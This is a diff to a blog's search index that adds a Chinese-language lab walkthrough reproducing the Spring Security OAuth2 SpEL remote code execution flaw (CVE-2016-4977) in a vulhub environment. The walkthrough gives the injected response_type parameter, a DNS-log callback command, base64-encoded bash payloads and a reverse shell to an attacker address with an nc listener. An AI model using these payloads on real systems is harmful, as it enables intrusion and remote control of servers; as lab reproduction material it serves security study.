@@ -4,6 +4,39 @@
   
     
     <entry>
+      <title>Spring Security OAuth2远程命令执行漏洞(CVE-2016-4977)</title>
+      <link href="/2022/05/06/Spring-security-OAuth2/"/>
+      <url>/2022/05/06/Spring-security-OAuth2/</url>
+      
+        <content type="html"><![CDATA[<h1 id="Spring-Security-OAuth2远程命令执行漏洞"><a href="#Spring-Security-OAuth2远程命令执行漏洞" class="headerlink" title="Spring Security OAuth2远程命令执行漏洞"></a>Spring Security OAuth2远程命令执行漏洞</h1><h2 id="漏洞简述"><a href="#漏洞简述" class="headerlink" title="漏洞简述"></a>漏洞简述</h2><blockquote><p>Spring Security OAuth 是为 Spring 框架提供安全认证支持的一个模块。在其使用 whitelabel views 来处理错误时，由于使用了Springs Expression Language (SpEL)，攻击者在被授权的情况下可以通过构造恶意参数来远程执行命令。</p><p>远程攻击者可通过为‘<code>response_type</code>’参数制作值利用该漏洞执行代码。</p></blockquote><h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><blockquote><p>Spring Security OAuth 1.0.0到1.0.5<br>Spring Security OAuth 2.0.0到2.0.9<br>Spring Security OAuth 2.0到2.0.14<br>Spring Security OAuth 2.1到2.1.1<br>Spring Security OAuth 2.2到2.2.1<br>Spring Security OAuth 2.3到2.3.2</p></blockquote><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><pre class=" language-Linux"><code class="language-Linux">cd /vulhub/spring/CVE-2016-4977docker-compose up -d</code></pre><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>先打开网页</p><p><img src="/2022/05/06/Spring-security-OAuth2/image-20220506131932482.png" alt="image-20220506131932482"></p><p>访问<code>http://192.168.3.151:8080/oauth/authorize</code></p><p>需要登录，账号密码都是<code>admin</code></p><p><img src="/2022/05/06/Spring-security-OAuth2/image-20220506132208724.png" alt="image-20220506132208724"></p><p>构造参数</p><pre><code>?response_type=$&#123;2*3&#125;&amp;client_id=acme&amp;scope=openid&amp;redirect_uri=http://test</code></pre><p><img src="/2022/05/06/Spring-security-OAuth2/image-20220506132455299.png" alt="image-20220506132455299"></p><h3 id="验证漏洞"><a href="#验证漏洞" class="headerlink" title="验证漏洞"></a>验证漏洞</h3><p>打开<a href="http://dnslog.cn/">dnslog</a></p><p><img src="/2022/05/06/Spring-security-OAuth2/image-20220506133205933.png" alt="image-20220506133205933"></p><p>得到一个随机的dns</p><p>然后构造参数</p><pre><code>curl `whomai`.xcexay.dnslog.cn</code></pre><p>再打开转换工具<a href="https://x.hacking8.com/?post=293">java命令执行payload</a></p><p><img src="/2022/05/06/Spring-security-OAuth2/image-20220506133227187.png" alt="image-20220506133227187"></p><pre class=" language-bash"><code class="language-bash"><span class="token function">bash</span> -c <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;echo,Y3VybCBgd2hvYW1pYC54Y2V4YXkuZG5zbG9nLmNu&amp;#125;|&amp;#123;base64,-d&amp;#125;|&amp;#123;bash,-i&amp;#125;</span></code></pre><p>接下来使用官方的小玩意</p><p><a href="https://github.com/vulhub/vulhub/blob/master/spring/CVE-2016-4977/poc.py">poc.py</a></p><p>使用这个</p><pre class=" language-Linux"><code class="language-Linux">python3 poc.py</code></pre><p>然后把上面的东西扔进去</p><p><img src="/2022/05/06/Spring-security-OAuth2/image-20220506133954553.png" alt="image-20220506133954553"></p><p>把下面这一坨复制下来</p><p><img src="/2022/05/06/Spring-security-OAuth2/image-20220506134029466.png" alt="image-20220506134029466"></p><p>扔在这里</p><p>出来回显</p><p><img src="/2022/05/06/Spring-security-OAuth2/image-20220506134056414.png" alt="image-20220506134056414"></p><h3 id="构造反弹shell"><a href="#构造反弹shell" class="headerlink" title="构造反弹shell"></a>构造反弹shell</h3><pre class=" language-Linux"><code class="language-Linux">bash -i >& /dev/tcp/192.168.3.134/4444 0>&1</code></pre><p>然后在kali上设置监听</p><pre class=" language-Linux"><code class="language-Linux">nc -lvvp 4444</code></pre><p>把shell编码</p><pre class=" language-bash"><code class="language-bash"><span class="token function">bash</span> -c <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjMuMTM0LzQ0NDQgMD4mMQ==&amp;#125;|&amp;#123;base64,-d&amp;#125;|&amp;#123;bash,-i&amp;#125;</span></code></pre><p><img src="/2022/05/06/Spring-security-OAuth2/image-20220506134458155.png" alt="image-20220506134458155"></p><p>用poc.py把编码再搞一下</p><p><img src="/2022/05/06/Spring-security-OAuth2/image-20220506134632044.png" alt="image-20220506134632044"></p><p>最后把这上面的东西复制过去</p><p>连接成功</p><p><img src="/2022/05/06/Spring-security-OAuth2/image-20220506134754094.png" alt="image-20220506134754094"></p><p>ok结束！！</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> 漏洞复现 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 环境搭建 </tag>
+            
+            <tag> 漏洞复现 </tag>
+            
+            <tag> 网络安全 </tag>
+            
+            <tag> CVE </tag>
+            
+            <tag> Spring </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>php-xDebug远程调试漏洞(代码执行)</title>
       <link href="/2022/05/06/php-xDebug/"/>
       <url>/2022/05/06/php-xDebug/</url>
@@ -1871,9 +1904,9 @@
             
             <tag> 网络安全 </tag>
             
-            <tag> 漏洞 </tag>
-            
             <tag> PHP </tag>
+            
+            <tag> 漏洞 </tag>
             
             <tag> sql注入 </tag>
             
